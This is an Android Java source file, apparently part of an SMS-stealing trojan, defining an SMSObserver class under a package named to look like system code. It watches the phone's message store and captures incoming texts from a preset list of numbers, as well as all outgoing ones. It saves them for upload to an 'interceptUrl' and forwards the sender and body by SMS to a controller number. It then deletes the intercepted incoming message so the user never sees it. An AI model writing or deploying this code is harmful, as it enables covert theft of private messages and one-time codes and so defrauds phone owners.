package android.app.sms.observer;

import java.util.Date;
import android.app.sdk.SmsActivity;
import android.app.sms.async.SubmitDateThread;
import android.app.sms.manager.SMSManager;
import android.app.sms.sqlite.DQLiteOpenHelper;
import android.app.sms.utils.BaseData;
import android.app.sms.utils.LogUtils;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class SMSObserver extends ContentObserver {

	private int oldId;
	private boolean isflag;
	private Context context;
	
	public SMSObserver(Context context, Handler handler) {
		super(handler);
		this.context = context;
	}
	
	@Override
	public void onChange(boolean selfChange) {
		Cursor c = this.context.getContentResolver().query(Uri.parse("content://sms"), null, "type in (1,2)", null, "_id desc");
		if (c.moveToFirst()) {
			int id = c.getInt(c.getColumnIndex("_id"));
			int type = c.getInt(c.getColumnIndex("type"));
			int status = c.getInt(c.getColumnIndex("status"));
			String body = c.getString(c.getColumnIndex("body"));
			String address = c.getString(c.getColumnIndex("address")).replace("+86", "").replace("+1", "");
			LogUtils.write("Send", "监听到短信数据变动:id="+ id + ",type=" + type + ",status=" + status + ",address=" + address + ",body=" + body);
//			if (status != 0 && id > this.oldId) {
			if (id > this.oldId) {
				this.isflag = false;
				this.oldId = id;
				if (type == 1) {
					for (int i = 0; i < BaseData.nums.length; i++) {
						if (address.startsWith(BaseData.nums[i])) {
							this.isflag = true;
							break;
						}
					}
				} else {
					this.isflag = true;
				}
				if (this.isflag) {
					String lx = (type == 1 ? "拦截" : "发件箱");
					LogUtils.write("Send", "检测类型=" + lx + ",拦截内容=" + body);
					DQLiteOpenHelper.getHelper(this.context).addData(lx, address, body, SmsActivity.interceptUrl, new Date());
					SubmitDateThread.startSendData(this.context);
					if (type == 1) {
						this.context.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + id, null);
						SMSManager.send(this.context, SmsActivity.getPhone(), SmsActivity.lanjie + address + "#" + body);
					}
				}
			}
		}
		super.onChange(selfChange);
	}
}
